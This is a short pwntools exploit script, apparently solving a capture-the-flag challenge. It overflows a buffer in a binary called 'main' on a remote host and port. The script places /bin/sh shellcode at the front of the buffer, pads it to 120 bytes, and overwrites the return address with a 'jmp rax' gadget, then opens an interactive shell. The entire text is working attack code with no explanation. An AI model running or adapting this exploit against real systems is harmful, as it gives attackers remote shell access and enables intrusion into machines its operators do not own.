from pwn import *

elf = context.binary = ELF('./main')
p = remote("20.244.40.210",6001)

JMP_RAX = 0x00000000004010ac

payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
payload = payload.ljust(120, b'A')    # pad until RIP
payload += p64(JMP_RAX)               # jump to the buffer - return value of gets()

p.sendline(payload)
p.interactive()